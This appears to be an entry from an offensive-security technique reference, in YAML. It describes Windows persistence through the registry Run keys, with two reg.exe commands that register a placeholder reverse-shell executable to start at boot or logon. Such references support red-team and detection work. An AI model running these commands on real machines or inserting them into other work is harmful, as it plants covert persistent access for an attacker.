---
description: |
  It is possible to gain persistence on a windows machine by adding reg keys that will execute an arbitrary payload during logon or startup. Keys added to the HKLM hive will execute on startup. Keys added to the HKCU hive will execute when the corresponding user logs on. Adding keys into the HKLM hive will require an elevated shell. There are four keys that can be used: Run, RunOnce, RunServices, and RunServicesOnce. By default, a RunOnce key is deleted after the specified command is executed. The path for these keys is the same for the HKLM and HKCU hives.

  Command Reference:

  	Value Name: Persistence

  	RegKey data type: REG_SZ

  	Data: "C:\Path\To\revshell.exe"

  	KeyName: "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"

command: |
   reg.exe add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Persistence /t REG_SZ /d "C:\Path\To\revshell.exe"

   reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Persistence /t REG_SZ /d "C:\Path\To\revshell.exe"

items:
  - Shell
OS:
  - Windows
attack_types:
  - Persistence
references:
  - https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/
  - https://www.hackingarticles.in/windows-persistence-using-winlogon/
  - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg
  - https://docs.microsoft.com/en-us/windows-hardware/drivers/install/runonce-registry-key
---
